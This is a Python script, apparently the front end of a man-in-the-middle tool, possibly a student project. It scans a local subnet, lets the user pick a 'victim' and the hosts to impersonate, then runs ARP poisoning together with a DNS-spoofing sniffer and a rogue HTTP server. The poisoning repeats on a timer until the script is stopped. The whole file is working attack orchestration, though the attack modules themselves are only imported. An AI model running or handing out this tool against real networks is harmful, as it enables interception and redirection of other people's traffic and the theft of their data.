from __future__ import unicode_literals
from scapy.all import get_if_list
from prompt_toolkit.shortcuts import radiolist_dialog, input_dialog, message_dialog, ch
from arp_poison import ARPPoisonAttack
from client import Client
from netifaces import ifaddresses, AF_INET
from ipaddress import ip_network
from dns_spoof import Sniffer
from time import sleep
from web import HTTPServer

from network_scan import NetworkScan
from utils import stu, uts

# Show GUI, where the user can select the interface they want to use (e.g. enp0s3)
iface = uts(radiolist_dialog(
    title="Interface",
    text="Select the interface to use",
    # The values that can be chosen from, are all interfaces (v) in the interface list. 
    # values = identifier, text. 
    values=[
        (stu(v), stu(v)) for v in get_if_list()
    ]
))

# If the user selects cancel, the GUI will be exited and the program will be stop executing. 
if iface == None:
    exit()

# Retrieve network address information for the interface, including the subnet mask
addresses = ifaddresses(iface)[AF_INET]
network = None

# If the program cannot find any ip addresses, the user will be asked to give the program an IP range. 
if len(addresses) == 0:
    cidr = uts(input_dialog(
        title='Address Range',
        text='Could not automatically determine IP range to use. Please enter an IP range in CIDR notation manually.'
    ))

    # Determines the network using the address range and IP range
    network = ip_network(cidr)
else:
    network = ip_network((addresses[0]['addr'], addresses[0]['netmask']), strict=False)

# Convert network info to CIDR format, such that always the same format is used
cidr = str(network)

# Looking for potential victims on the network
scan = NetworkScan(iface, cidr)
clients = scan.execute()

# If there were no victims found, it the program stops executing.
if(len(clients) == 0):
    message_dialog(
        title='No network devices found',
        text='No clients have been found.',
        ok_text='Exit'
    )

    exit()

# Show all the victims the user can choose between
victim = radiolist_dialog(
    title='Select network device',
    text='Please select a victim:',
    # values = identifier, text. 
    values=[
        (c, stu(c.getMAC()) + ' - ' + stu(c.getIP())) for c in clients
    ]
)

# non sequence
spoofVictims = radiolist_dialog(
    title='Select network device',
    text='Please select the addresses that you want to spoof:',
    # values = identifier, text. 
    values=[
        ([c], stu(c.getMAC()) + ' - ' + stu(c.getIP())) for c in clients
    ] + [
        (clients, 'All of the options above')
    ]
)

# The time the attack will be repeated in seconds
repeatAttackTime = uts(input_dialog(
    title='Repeat Time',
    text='Enter a time in seconds, \nfor which the program will resend every time a new ARP attack. \n Recommended: 5'
))

# Execute the arp attack, with the known iface, victim and selected spoof victims.
arpAttack = ARPPoisonAttack(iface, victim, spoofVictims)
arpAttack.execute()

sniffer = Sniffer(iface, victim)
httpServer = HTTPServer()

print("[*] Start sniffing...")
sniffer.start()

httpServer.start()

# Repeat attack until the program is stopped (ctrl+c)
try:
    while True:
        sleep(float(repeatAttackTime))
        arpAttack.execute()
except KeyboardInterrupt:
    print("[*] Stop sniffing")
    sniffer.join(2.0)

    if sniffer.isAlive():
        sniffer.socket.close()